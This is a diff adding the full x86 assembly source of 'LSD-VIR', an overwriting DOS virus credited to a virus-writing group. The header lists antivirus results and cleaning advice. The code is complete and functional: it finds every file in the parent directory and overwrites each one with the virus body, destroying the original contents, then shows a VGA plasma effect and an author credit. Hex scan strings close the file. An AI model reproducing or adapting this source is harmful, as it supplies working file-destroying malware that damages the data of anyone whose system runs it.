@@ -1,0 +1,446 @@
+   ;
+   ;           ÛÛÛÛÛÛÛ     Û        Û  ÛÛÛÛÛÛÛÛÛ  Û ÛÛÛÛÛÛÛÛ
+   ;          Û       Û    Û        Û  Û          ÛÛÛ     ÛÛ
+   ;         Û         Û   Û        Û  Û          Û       ÛÛ
+   ;         ÛÛÛÛÛÛÛÛÛÛÛ   Û        Û  Û          Û
+   ;         Û         Û   Û        Û  Û          Û
+   ;         Û         Û    Û      Û   Û          Û
+   ;         Û         Û     ÛÛÛÛÛÛ    ÛÛÛÛÛÛÛÛÛ  Û
+   ;
+   ;
+   ;
+   ;       ÛÛÛÛÛÛÛÛ  ÛÛÛÛÛÛÛ   Û      Û  ÛÛÛÛÛ   Û    Û    ÛÛÛÛÛ    Û
+   ;       Û    Û       Û  Û      Û  Û    Û  ÛÛ   Û   Û     Û   Û
+   ;       Û    Û       Û  Û      Û  ÛÛÛÛÛ   Û Û  Û  Û       Û  Û
+   ;       Û     Û    Û       Û  Û      Û  Û  Û    Û  Û Û  ÛÛÛÛÛÛÛÛÛ  Û
+   ;       Û     Û    Û       Û  Û      Û  Û   Û   Û   ÛÛ  Û       Û  Û
+   ;         ÛÛÛÛÛ      ÛÛÛÛÛÛÛ    ÛÛÛÛÛÛ   Û    Û  Û    Û  Û       Û  ÛÛÛÛÛÛ
+   ;
+   ;
+   ;        Distributed By The American Virus Creation and Research Society
+   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+   ; -------------------------------------------------------------------
+   ; Name of Virus: LSD-VIR
+   ; -------------------------------------------------------------------
+   ; Alias: None
+   ; -------------------------------------------------------------------
+   ; Type of code: Not informed
+   ; -------------------------------------------------------------------
+   ; VSUM Information - (NONE)
+   ; -------------------------------------------------------------------
+   ; Scan String - At End Of This File
+   ; -------------------------------------------------------------------
+   ; Antivirus information:
+   ; (1) Thunder Byte (TBSCAN) reported "LSD-VIR.COM" as
+   ;       clean
+   ; (2) Frisk Software's F-Protect (F-PROT) reported "LSD-VIR.COM" as
+   ;       "Infection: Trivial.LSD"
+   ; (3) McAfee softwares anti virus (SCAN.EXE) reported "LSD-VIR.COM" as
+   ;       clean
+   ; -------------------------------------------------------------------
+   ; Execution results:
+   ; It infects every file only in the previous directory using the dot dot
+   ; method. It then shows some neat plasma effects only vissible with
+   ; VGA and then write a copyright message.
+   ; -------------------------------------------------------------------
+   ; Cleaning RECOMENDATIONS: Delete infeted files this is an overwriting virus.
+   ; -------------------------------------------------------------------
+   ;       PAGE    60,132
+   ;
+   ;
+
+
+   ;ÄÄÄÄÄÄÄÄÄÄ CODE_SEG_1  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+   CODE_SEG_1      segment para public
+           assume  CS:CODE_SEG_1, DS:CODE_SEG_1, SS:CODE_SEG_1, ES:CODE_SEG_1
+
+
+           org     100h
+
+
+   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
+   ;±
+   ;±              ENTRY POINT
+   ;±
+   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
+
+
+   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
+   ;±
+   ;±              PROCEDURE proc_start
+   ;±
+   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
+
+   proc_start      proc    far
+   start:          ; N-Ref=0
+           mov     AH,47h                  ; 'G'
+           mov     DL,0
+           lea     SI,Word Ptr var1_6dd[BP]; Load effective address
+           int     21h                     ; DOS func ( ah ) = 47h
+                           ; Get current directory
+                           ;DL-drive ID
+                           ; DS:SI-ptr to data area
+                           ;if CF=1 AX-ret code, else
+                           ; DS:SI-full path name
+           jne     loc_1                   ; Jump if not equal ( != )
+   loc_1:          ; N-Ref=1
+           mov     DX,offset var1_6da
+           mov     AH,3Bh                  ; ';'
+           int     21h                     ; DOS func ( ah ) = 3Bh
+                           ; CHDIR: Change directory
+                           ;DS:DX-ASCIIZ string
+                           ;AX-ret code if CF set
+           jne     loc_2                   ; Jump if not equal ( != )
+   loc_2:          ; N-Ref=1
+           mov     DX,offset var1_71d
+           push    BP
+           mov     AH,4Eh                  ; 'N'
+   loc_3:          ; N-Ref=1
+           int     21h                     ; DOS func ( ah ) = 4Eh
+                           ; FIND FIRST: Start file search
+                           ;CX-attr to search on
+                           ; DS:DX-ASCIIZ string
+                           ;if CF=1 AX-ret code
+           jb      loc_4                   ; Jump if below ( < )
+           mov     AH,2Fh                  ; '/'
+           int     21h                     ; DOS func ( ah ) = 2Fh
+                           ; Get DTA address
+                           ;AX-ret code ES:BX-DTA
+           mov     SI,BX
+           mov     AX,4301h
+           xor     CX,CX
+           lea     DX,Word Ptr [SI+1Eh]    ; Load effective address
+           int     21h                     ; DOS func ( ah ) = 43h
+                           ; CHMOD:Get/set file attributes
+                           ;AL-(0/1)get/set code CX-attrib
+                           ; DS:DX-ASCIIZ string
+                           ;if CF=1 AX-ret code
+                           ; CX-attrib if set used
+           mov     AX,3D02h
+           int     21h                     ; DOS func ( ah ) = 3Dh
+                           ; Open file
+                           ;CX-acsess code
+                           ;  DS:DX-ASCIIZ string
+                           ;AX-file handle
+                           ; if CF=1 AX-error code
+           xchg    BX,AX
+           mov     AH,40h                  ; '@'
+           mov     CX,640h
+           mov     DX,offset var1_100
+           int     21h                     ; DOS func ( ah ) = 40h
+                           ; Write to file or device
+                           ;BX-file handle
+                           ; CX-bytes to read  DS:DX-DTA
+                           ;if CF=0 AX-bytes read
+                           ; else AX-ret code
+           mov     AH,3Eh                  ; '>'
+           int     21h                     ; DOS func ( ah ) = 3Eh
+                           ; Close file handle
+                           ;BX-file handle
+                           ;if CF=1 AX-ret code
+           mov     AH,4Fh                  ; 'O'
+           jmp     short loc_3
+   loc_4:          ; N-Ref=1
+           pop     BP
+           lea     DX,Word Ptr var1_6dd[BP]; Load effective address
+           mov     AH,3Bh                  ; ';'
+           int     21h                     ; DOS func ( ah ) = 3Bh
+                           ; CHDIR: Change directory
+                           ;DS:DX-ASCIIZ string
+                           ;AX-ret code if CF set
+           jne     loc_5                   ; Jump if not equal ( != )
+   loc_5:          ; N-Ref=1
+           call    near ptr proc_1
+   proc_start      endp
+
+
+
+   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
+   ;±
+   ;±              PROCEDURE proc_1
+   ;±
+   ;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
+
+   proc_1          proc    near
+           cld                             ; Clear direction flag
+           mov     AX,13h
+           int     10h                     ; BIOS Service func ( ah ) = 0
+                           ; Set video mode
+                           ;AL = video mode
+           cli                             ; Disable interrupts
+           mov     DX,3C4h
+           mov     AX,604h
+           out     DX,AX                   ; Output to port [DX] from AX
+           mov     AX,0F02h
+           out     DX,AX                   ; Output to port [DX] from AX
+           mov     DX,3D4h
+           mov     AX,14h
+           out     DX,AX                   ; Output to port [DX] from AX
+           mov     AX,0E317h
+           out     DX,AX                   ; Output to port [DX] from AX
+           mov     AL,9
+           out     DX,AL                   ; Output to port [DX] from AX
+           inc     DX
+           in      AL,DX                   ; Input to AX from port [DX]
+           and     AL,0E0h
+           add     AL,7
+           out     DX,AL                   ; Output to port [DX] from AX
+           mov     DX,3C8h
+           mov     AL,80h
+           out     DX,AL                   ; Output to port [DX] from AX
+           inc     DX
+           mov     CX,180h
+           mov     SI,offset var1_3d1
+   loop_loc_6:             ; N-Ref=1
+           lodsb                           ; Load byte at DS:SI to AL
+           out     DX,AL                   ; Output to port [DX] from AX
+           loop    loop_loc_6              ; Loop if CX > 0
+           mov     AX,0A000h
+           mov     ES,AX
+
+   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+           assume  ES:nothing
+   ;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
+
+           mov     SI,offset var1_281
+   loc_7:          ; N-Ref=1
+           mov     DX,3DAh
+   loc_8:          ; N-Ref=1
+           in      AL,DX                   ; Input to AX from port [DX]
+           test    AL,8
+           je      loc_8                   ; Jump if equal ( = )
+   loc_9:          ; N-Ref=1
+           in      AL,DX                   ; Input to AX from port [DX]
+           test    AL,8
+           jne     loc_9                   ; Jump if not equal ( != )
+           xor     DI,DI
+           mov     AH,32h                  ; '2'
+           mov     CL,Byte Ptr var1_6d8    ; [66AC:06D8] = 0
+           mov     CH,Byte Ptr var1_6d9    ; [66AC:06D9] = 2E00h
+   loc_10:         ; N-Ref=1
+           push    AX
+           mov     AH,50h                  ; 'P'
+           mov     DL,Byte Ptr var1_6d6    ; [66AC:06D6] = 0
+           mov     DH,Byte Ptr var1_6d7    ; [66AC:06D7] = 0
+   loc_11:         ; N-Ref=1
+           mov     BX,BP
+           mov     AL,BL
+           xor     BH,BH
+           mov     BL,DL
+           add     AL,Byte Ptr [BX+SI]
+           mov     BL,DH
+           add     AL,Byte Ptr [BX+SI]
+           mov     BL,CL
+           add     AL,Byte Ptr [BX+SI]
+           mov     BL,CH
+           add     AL,Byte Ptr [BX+SI]
+           or      AL,80h
+           stosb                           ; Store AL at ES:DI
+           add     DL,1
+           add     DH,3
+           dec     AH
+           jne     loc_11                  ; Jump if not equal ( != )
+           add     CL,2
+           add     CH,1
+           pop     AX
+           dec     AH
+           jne     loc_10                  ; Jump if not equal ( != )
+           dec     BP
+           mov     BX,BP
+           xor     BL,BH
+           xor     BL,Byte Ptr [DI-1]
+           xor     BL,CL
+           xor     BL,DL
+           add     BL,CH
+           add     BL,DH
+           xor     BH,BH
+           mov     DI,offset var1_551
+           test    BL,8
+           jne     loc_12                  ; Jump if not equal ( != )
+           and     BL,3
+           cmp     Byte Ptr [BX+DI],3
+           jnle    loc_13                  ; Jump if greater ( > )
+           inc     Byte Ptr [BX+DI]
+           jmp     short loc_13
+
+           db      90h
+   loc_12:         ; N-Ref=1
+           and     BL,3
+           cmp     Byte Ptr [BX+DI],0FDh
+           jl      loc_13                  ; Jump if less ( < )
+           dec     Byte Ptr [BX+DI]
+   loc_13:         ; N-Ref=3
+           mov     DL,Byte Ptr var1_551    ; [66AC:0551] = 102h
+           mov     DH,Byte Ptr var1_552    ; [66AC:0552] = 301h
+           mov     CL,Byte Ptr var1_553    ; [66AC:0553] = 403h
+           mov     CH,Byte Ptr var1_554    ; [66AC:0554] = 4
+           add     Byte Ptr var1_6d6,DL    ; [66AC:06D6] = 0
+           sub     Byte Ptr var1_6d7,DH    ; [66AC:06D7] = 0
+           add     Byte Ptr var1_6d8,CL    ; [66AC:06D8] = 0
+           sub     Byte Ptr var1_6d9,CH    ; [66AC:06D9] = 2E00h
+           mov     AH,1
+           int     16h                     ; BIOS Service func ( ah ) = 1
+                           ; Kbd char ready report
+                           ;AH-scan code AL-char code
+           jne     loc_14                  ; Jump if not equal ( != )
+           jmp     loc_7
+   loc_14:         ; N-Ref=1
+           xor     AH,AH
+           int     16h                     ; BIOS Service func ( ah ) = 0
+                           ; Read next kbd char
+                           ;AH-scan code AL-char code
+           mov     AX,3
+           int     10h                     ; BIOS Service func ( ah ) = 0
+                           ; Set video mode
+                           ;AL = video mode
+           mov     DX,offset var1_381
+           mov     AH,9
+           int     21h                     ; DOS func ( ah ) = 9
+                           ; Display string
+                           ;DS:DX-output string
+           mov     AX,4C00h
+           int     21h                     ; DOS func ( ah ) = 4Ch
+                           ; Terminate process
+                           ;AL-ret code
+   proc_1          endp
+
+
+
+   var1_256        db      'Author:Death Dealer Of [TeMpEsT]Virus:[LSD]'
+   var1_281        db      8 dup (40h)
+           db      5 dup (3Fh)
+           db      4 dup (3Eh)
+           db      '===<<;;;::99887765544322100/..-,,+*))(''&%%$'
+   var1_2bd        db      '#""! '
+           db      1Fh, 1Eh, 1Eh, 1Dh, 1Ch, 1Bh
+           db      1Bh, 1Ah, 19h, 18h, 17h, 17h
+           db      16h, 15h, 14h, 14h, 13h, 12h
+           db      12h, 11h, 10h, 10h, 0Fh, 0Eh
+           db      0Eh, 0Dh, 0Ch, 0Ch, 0Bh, 0Bh
+   var1_2e0        db      0Ah, 9, 9, 8, 8, 7
+           db      7, 6, 6, 5, 5, 5
+           db      4, 4, 3, 3, 3
+           db      4 dup (2)
+           db      5 dup (1)
+           db      15 dup (0)
+           db      5 dup (1)
+           db      4 dup (2)
+           db      3, 3, 3, 4, 4, 5
+           db      5, 5, 6, 6, 7, 7
+           db      8, 8
+   var1_320        db      9, 9, 0Ah, 0Bh, 0Bh, 0Ch
+           db      0Ch, 0Dh, 0Eh, 0Eh, 0Fh, 10h
+           db      10h, 11h, 12h, 12h, 13h, 14h
+           db      14h, 15h, 16h, 17h, 17h, 18h
+           db      19h, 1Ah, 1Bh, 1Bh, 1Ch, 1Dh
+           db      1Eh, 1Eh, 1Fh
+   var1_341        db      ' !""#$'
+   var1_347        db      '%%&''())*+,,-../00122344556778899::;;;<<===>>>>????'
+           db      '?@@@@@@@'
+   var1_381        db      8 dup (20h)
+           db      'LSD ViRuS 1.0'
+           db      0Dh, 0Ah, 0Ah
+           db      'Coded By Death Dealer 4/29/94'
+           db      0Dh, 0Ah
+           db      8 dup (20h)
+           db      '[TeMpEsT -94]'
+           db      0Dh, 0Ah, 0Ah, 24h
+   var1_3d1        db      3Fh, 0, 3Fh, 3Fh, 2, 3Dh
+           db      3Fh, 4, 3Bh, 3Fh, 6, 39h
+           db      3Fh, 8
+   var1_3df        db      37h, 3Fh, 0Ah, 35h, 3Fh, 0Ch
+           db      33h, 3Fh, 0Eh, 31h, 3Fh, 10h
+           db      2Fh, 3Fh, 12h, 2Dh, 3Fh, 14h
+           db      2Bh, 3Fh, 16h, 29h, 3Fh, 18h
+           db      27h, 3Fh, 1Ah, 25h, 3Fh, 1Ch
+           db      23h, 3Fh, 1Eh
+   var1_400        db      '!? '
+           db      1Fh, 3Fh, 22h, 1Dh, 3Fh, 24h
+           db      1Bh, 3Fh, 26h, 19h, 3Fh, 28h
+           db      17h, 3Fh, 2Ah, 15h, 3Fh, 2Ch
+           db      13h, 3Fh, 2Eh, 11h, 3Fh, 30h
+           db      0Fh
+   var1_41c        db      3Fh, 32h, 0Dh, 3Fh, 34h, 0Bh
+   var1_422        db      3Fh, 36h, 9, 3Fh, 38h, 7
+           db      3Fh, 3Ah, 5, 3Fh, 3Ch, 3
+           db      3Fh, 3Eh, 1, 3Fh, 3Fh, 0
+           db      3Dh, 3Fh, 2, 3Bh, 3Fh, 4
+           db      39h, 3Fh, 6, 37h, 3Fh, 8
+   var1_440        db      35h, 3Fh, 0Ah, 33h, 3Fh, 0Ch
+           db      31h, 3Fh, 0Eh, 2Fh, 3Fh, 10h
+           db      2Dh, 3Fh, 12h, 2Bh, 3Fh, 14h
+           db      29h, 3Fh, 16h, 27h, 3Fh, 18h
+           db      25h, 3Fh, 1Ah, 23h, 3Fh, 1Ch
+           db      21h, 3Fh, 1Eh, 1Fh, 3Fh, 20h
+           db      1Dh, 3Fh, 22h, 1Bh, 3Fh, 24h
+           db      19h, 3Fh, 26h, 17h, 3Fh, 28h
+           db      15h, 3Fh, 2Ah, 13h, 3Fh, 2Ch
+           db      11h, 3Fh, 2Eh, 0Fh
+   var1_47a        db      3Fh, 30h, 0Dh, 3Fh, 32h, 0Bh
+   var1_480        db      3Fh, 34h, 9, 3Fh, 36h, 7
+           db      3Fh, 38h, 5, 3Fh, 3Ah, 3
+           db      3Fh, 3Ch, 1, 3Fh, 3Eh, 0
+           db      3Fh, 3Fh, 0, 3Dh, 3Fh, 0
+           db      3Bh, 3Fh, 0, 39h, 3Fh, 0
+           db      37h, 3Fh, 0, 35h, 3Fh, 0
+           db      33h, 3Fh, 0, 31h, 3Fh, 0
+           db      2Fh, 3Fh, 0, 2Dh, 3Fh, 0
+           db      2Bh, 3Fh, 0, 29h, 3Fh, 0
+           db      27h, 3Fh, 0, 25h, 3Fh, 0
+           db      23h, 3Fh, 0, 21h, 3Fh, 0
+           db      1Fh, 3Fh, 0, 1Dh, 3Fh, 0
+           db      1Bh, 3Fh, 0, 19h, 3Fh, 0
+           db      17h, 3Fh, 0, 15h, 3Fh, 0
+           db      13h, 3Fh, 0, 11h, 3Fh, 0
+           db      0Fh, 3Fh, 0, 0Dh, 3Fh, 0
+           db      0Bh, 3Fh, 0, 9, 3Fh, 0
+           db      7, 3Fh, 0, 5, 3Fh, 0
+           db      3, 3Fh, 0, 1, 3Fh, 0
+           db      0, 3Fh, 2, 0, 3Fh, 4
+           db      0, 3Fh, 6, 0, 3Fh, 8
+           db      0, 3Fh, 0Ah, 0, 3Fh, 0Ch
+           db      0, 3Fh, 0Eh, 0, 3Fh, 10h
+           db      0, 3Fh, 12h, 0, 3Fh, 14h
+           db      0, 3Fh, 16h, 0, 3Fh, 18h
+           db      0, 3Fh, 1Ah, 0, 3Fh, 1Ch
+           db      0, 3Fh, 1Eh, 0, 3Fh, 20h
+           db      0, 3Fh, 22h, 0, 3Fh, 24h
+           db      0, 3Fh, 26h, 0, 3Fh, 28h
+           db      0, 3Fh, 2Ah, 0, 3Fh, 2Ch
+           db      0, 3Fh, 2Eh, 0, 3Fh, 30h
+           db      0, 3Fh, 32h, 0, 3Fh, 34h
+           db      0, 3Fh, 36h, 0, 3Fh, 38h
+           db      0, 3Fh, 3Ah, 0, 3Fh, 3Ch
+           db      0, 3Fh, 3Eh, 0, 3Fh
+   var1_551        db      2
+   var1_552        db      1
+   var1_553        db      3
+   var1_554        db      4
+           db      385 dup (0)
+   var1_6d6        db      0
+   var1_6d7        db      0
+   var1_6d8        db      0
+   var1_6d9        db      0
+   var1_6da        db      2Eh, 2Eh, 0
+   var1_6dd        dw      32 dup (0)
+   var1_71d        db      '*.*'
+           db      0
+   var1_721        db      'V'
+           db      30 dup (5Ah)
+   CODE_SEG_1      ends
+
+
+
+           end     start
+
+   ; File Name   : LSD-VIR.COM
+   ;
+   ;  26 A0 C9 57 3A 06 C8 57 75 0A 9A 7F 08 5A 23 9A FC 01 83 26 83 3E 0B 00 00
+   ;  74 33 A0 C9 57 3A 06 C8 57 74 13 83 3E 0C 5A 0A 74 07 83 3E 0C 5A 07 75 05
+   ;  SS:SP  2
+   ; File Name   : LSD-VIR.COM
+   ;
+   ;  49 52 2E 43 4F 4D B4 47 76 21 9A EB 0D 83 26 A0 C9 57 3A 06 C8 57 0B 00 9A
+   ;  7F 08 5A 23 9A FC 01 83 26 83 3E 0B 00 00 74 33 A0 C9 57 3A 06 C8 57 74 13
+   ;
